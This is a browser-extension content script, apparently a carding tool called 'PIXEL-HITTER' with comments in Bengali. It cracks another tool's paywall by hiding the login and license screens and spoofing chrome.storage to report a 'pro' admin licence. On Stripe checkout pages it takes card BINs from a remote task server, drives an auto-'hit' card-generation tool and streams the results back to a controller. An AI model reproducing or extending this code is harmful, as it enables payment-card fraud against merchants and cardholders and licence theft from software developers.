(function() {
    const DEBUG = true;
    if (DEBUG) console.log("--- PIXEL-HITTER ACTIVE: FORCED BYPASS MODE ---");

    // ১. জোরপূর্বক লগইন স্ক্রিন লুকানোর স্টাইল (CSS)
    const style = document.createElement('style');
    style.innerHTML = `
        #loginWrap, .login-wrap, [class*="login"], div[class*="License"] {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            z-index: -9999 !important;
            pointer-events: none !important;
        }
        #app {
            display: block !important;
            visibility: visible !important;
            opacity: 1 !important;
            z-index: 9999 !important;
        }
        .modal-overlay, .dimmer {
            display: none !important;
        }
    `;
    document.head.appendChild(style);

    // ২. স্টোরেজ হ্যাক (Always Pro - Force)
    if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
        const originalGet = chrome.storage.local.get;
        chrome.storage.local.get = function(keys, callback) {
            const spoofed = { 
                user_plan: 'pro', 
                level: 'admin', 
                is_logged_in: true, 
                license: 'active',
                status: 'active',
                plan: 'pro',
                id: 'admin_1'
            };
            if (typeof callback === 'function') {
                callback(spoofed);
            }
        };
    }

    // ৩. বাটন এবং ইনপুট গভীর থেকে খোঁজা
    function findElement(selector, textMatch = null) {
        let el = document.querySelector(selector);
        if (!el) {
            const all = document.querySelectorAll('*');
            for (let item of all) {
                if (item.shadowRoot) {
                    let sub = item.shadowRoot.querySelector(selector);
                    if (sub) { el = sub; break; }
                }
            }
        }
        if (el && textMatch && !el.innerText.toLowerCase().includes(textMatch.toLowerCase())) return null;
        return el;
    }

    const startHitter = () => {
        if (!window.location.host.includes("stripe.com") && !window.location.host.includes("pay.checkout")) {
            return;
        }

        console.log("[Hitter] Checking for tasks via Background Proxy...");
        
        chrome.runtime.sendMessage({ type: "FETCH_TASK" }, (task) => {
            if (!task || !task.bin) {
                console.log("[Hitter] No task or invalid BIN.");
                return;
            }

            console.log("[Hitter] Task found! BIN:", task.bin);
            
            let attempts = 0;
            const checkUI = setInterval(() => {
                attempts++;
                
                // বিভিন্ন সিলেক্টর দিয়ে ইনপুট খোঁজা
                const binInp = document.querySelector('#quickBinInput') || 
                               findElement('input[placeholder*="BIN"]') || 
                               findElement('input[name*="bin"]');

                // বিভিন্ন সিলেক্টর দিয়ে বাটন খোঁজা
                const startBtn = document.querySelector('#quickBinUseBtn') || 
                                 findElement('button', 'Start') || 
                                 findElement('div', 'Start') || 
                                 findElement('span', 'Start');

                if (binInp && startBtn) {
                    clearInterval(checkUI);
                    console.log("[Hitter] UI Elements found! Executing...");

                    binInp.value = task.bin;
                    binInp.dispatchEvent(new Event('input', { bubbles: true }));
                    binInp.dispatchEvent(new Event('change', { bubbles: true }));

                    setTimeout(() => {
                        console.log("[Hitter] Clicking Start...");
                        startBtn.click();
                        
                        // ব্যাকআপ ক্লিক ইভেন্ট
                        ['mousedown', 'click', 'mouseup'].forEach(evt => {
                           const e = new MouseEvent(evt, { view: window, bubbles: true, cancelable: true });
                           startBtn.dispatchEvent(e);
                        });

                        reportToCloud("STARTED", task.bin, "Bypassed login and started auto-hit.");
                        monitorLogs(task.bin);
                    }, 800);
                }

                if (attempts > 30) {
                    console.log("[Hitter] UI not found. Force reloading dashboard logic...");
                    clearInterval(checkUI);
                }
            }, 1000);
        });
    };

    const reportToCloud = (status, bin, msg = "") => {
        chrome.runtime.sendMessage({ 
            type: "REPORT_LIVE", 
            data: { status: status, bin: bin, msg: msg } 
        });
    };

    const monitorLogs = (bin) => {
        let lastLog = "";
        setInterval(() => {
            const logElement = document.getElementById('logs') || findElement('textarea#logs');
            if (logElement) {
                const currentText = logElement.value || logElement.innerText;
                if (currentText !== lastLog) {
                    const newContent = currentText.replace(lastLog, "").trim();
                    if (newContent) {
                        console.log("[Hitter] Log Update:", newContent);
                        reportToCloud("LOG", bin, newContent);
                    }
                    lastLog = currentText;
                }
            }
        }, 1500);
    };

    // ৫. ফোর্স ড্যাশবোর্ড ডিসপ্লে লুপ
    setInterval(() => {
        const login = document.getElementById('loginWrap');
        if (login) login.setAttribute('style', 'display: none !important');

        const app = document.getElementById('app');
        if (app) app.setAttribute('style', 'display: block !important');

        if (window.location.host.includes("stripe.com") && !window.isAutoRunning) {
            window.isAutoRunning = true;
            startHitter();
        }
    }, 2000);

})();
